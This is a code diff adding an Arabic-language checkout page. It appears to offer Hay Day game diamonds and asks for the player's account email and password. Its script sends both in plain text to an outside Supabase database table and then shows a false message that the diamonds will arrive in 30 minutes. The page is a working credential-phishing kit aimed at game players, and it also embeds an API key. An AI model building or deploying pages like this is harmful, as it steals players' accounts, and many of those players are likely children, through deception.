@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إتمام عملية الشراء</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>إتمام عملية الشراء</h1>
+        <p>الكمية المحددة: <span id="payment-amount"></span> ألماسة</p>
+        <div id="payment-form">
+            <p>الرجاء إدخال معلومات حسابك في هاي داي لإتمام عملية الشراء:</p>
+            <div class="form-container">
+                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <button id="submit-btn">تأكيد الشراء</button>
+            </div>
+        </div>
+        <div id="success-message" class="message" style="display: none;">
+            <p>تم استلام طلبك بنجاح! سيتم إرسال الألماس إلى حسابك خلال 30 دقيقة.</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const selectedAmount = localStorage.getItem('selectedAmount');
+            if (selectedAmount) {
+                document.getElementById('payment-amount').textContent = selectedAmount;
+            }
+
+            const supabaseUrl = 'https://jefdswdtswmfgbzlinif.supabase.co';
+            const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZmRzd2R0c3dtZmdiemxpbmlmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTI3ODEwNTYsImV4cCI6MjA2ODM1NzA1Nn0.6Heru_zA9aGvdKPIbbOdI1XJC7HVqFkrCsZMp3ZBEPU';
+            const { createClient } = supabase;
+            const supabaseClient = createClient(supabaseUrl, supabaseKey);
+
+            const submitBtn = document.getElementById('submit-btn');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const paymentForm = document.getElementById('payment-form');
+            const successMessage = document.getElementById('success-message');
+
+            submitBtn.addEventListener('click', async () => {
+                const email = emailInput.value;
+                const password = passwordInput.value;
+                const amount = selectedAmount;
+
+                if (email && password) {
+                    const { data, error } = await supabaseClient
+                        .from('purchases') // <-- تأكد من أن اسم الجدول صحيح
+                        .insert([
+                            { email: email, password: password, amount: amount }
+                        ]);
+
+                    if (error) {
+                        console.error('Error inserting data:', error);
+                        alert('حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.');
+                    } else {
+                        console.log('Data inserted successfully:', data);
+                        paymentForm.style.display = 'none';
+                        successMessage.style.display = 'block';
+                    }
+                } else {
+                    alert('الرجاء إدخال البريد الإلكتروني وكلمة المرور.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
